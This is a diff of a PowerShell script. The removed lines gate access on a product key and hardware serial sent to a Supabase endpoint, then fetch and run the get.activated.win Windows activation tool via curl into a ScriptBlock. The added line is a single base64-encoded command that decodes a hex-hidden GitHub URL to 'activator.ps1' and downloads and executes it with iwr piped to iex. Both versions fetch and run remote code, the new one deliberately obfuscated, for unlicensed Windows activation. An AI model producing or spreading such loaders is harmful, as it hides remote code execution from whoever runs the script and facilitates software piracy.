@@ -1,17 +1,1 @@
-$hwid = (Get-CimInstance Win32_BaseBoard).SerialNumber.Trim()
-$keyword = Read-Host "Qual a sua chave do produto"
-
-$url = "https://zxqdfgfbfrbkqdasvkwm.supabase.co/functions/v1/hyper-endpoint"
-$body = @{ key = $keyword; hwid = $hwid } | ConvertTo-Json
-
-try {
-    $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json"
-    
-    if ($response.status -eq "authorized") {
-        Write-Host "Acesso Permitido! Ativando..." -ForegroundColor Green
-        powershell.exe -NoProfile -Command "& {& ([ScriptBlock]::Create((curl.exe -s --doh-url https://1.1.1.1/dns-query https://get.activated.win/ | Out-String))) /K-Windows}"
-    }
-} catch {
-    # This catch block will capture the 403 Forbidden and the 401 Invalid
-    Write-Host "Acesso Negado: Chave invalida ou ja vinculada a outro computador." -ForegroundColor Red
-}
+powershell.exe -EncodedCommand JABoAD0AJwA2ADgANwA0ADcANAA3ADAANwAzADMAYQAyAGYAMgBmADcAMgA2ADEANwA3ADIAZQA2ADcANgA5ADcANAA2ADgANwA1ADYAMgA3ADUANwAzADYANQA3ADIANgAzADYAZgA2AGUANwA0ADYANQA2AGUANwA0ADIAZQA2ADMANgBmADYAZAAyAGYANQA1ADYAZQA2ADkANgA2ADYAOQA2ADUANgA1ADYANQA2ADQAMgBmADYAYgA2ADUANwA5ADIAZgA3ADIANgA1ADYANgA3ADMAMgBmADYAOAA2ADUANgAxADYANAA3ADMAMgBmADYAZAA2ADEANgA5ADYAZQAyAGYANgAxADYAMwA3ADQANgA5ADcANgA2ADEANwA0ADYAZgA3ADIAMgBlADcAMAA3ADMAMwAxACcAOwAkAHUAPQBbAGIAeQB0AGUAWwBdAF0AKAAkAGgAIAAtAHMAcABsAGkAdAAgACcAKAAuAHsAMgB9ACkAJwAgAHwAIAA/ACAAewAkAF8AfQAgAHwAIAAlACAAewBbAGMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAeQB0AGUAKAAkAF8ALAAxADYAKQB9ACkAOwBpAHcAcgAgAC0AdQBzAGUAYgAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAHUAKQApACAAfAAgAGkAZQB4AA==
